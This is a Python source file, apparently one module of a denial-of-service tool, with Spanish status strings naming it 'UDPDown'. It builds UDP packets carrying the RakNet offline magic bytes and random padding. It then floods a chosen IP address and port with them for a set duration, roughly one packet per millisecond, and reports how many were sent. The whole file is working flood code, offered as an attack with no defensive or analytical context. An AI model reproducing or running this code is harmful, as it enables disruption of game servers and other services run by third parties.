import socket
import time
import random
import asyncio

def generate_raknet_packet(size=1460):
    header = b'\x00'
    magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
    payload_size = size - len(header) - len(magic)
    if payload_size < 0:
        payload_size = 0
    payload = random.randbytes(payload_size)
    return header + magic + payload

async def run(ip, port, duration, stop_event=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1460
    end_time = time.time() + duration
    sent = 0
    try:
        while time.time() < end_time:
            if stop_event is not None and stop_event.is_set():
                break
            raknet_packet = generate_raknet_packet(packet_size)
            sock.sendto(raknet_packet, (ip, port))
            sent += 1
            await asyncio.sleep(0.001)
    except Exception as e:
        return f"[UDPDown Error] {e}"
    finally:
        sock.close()
    return f"UDPDown terminado. Paquetes enviados: {sent}"
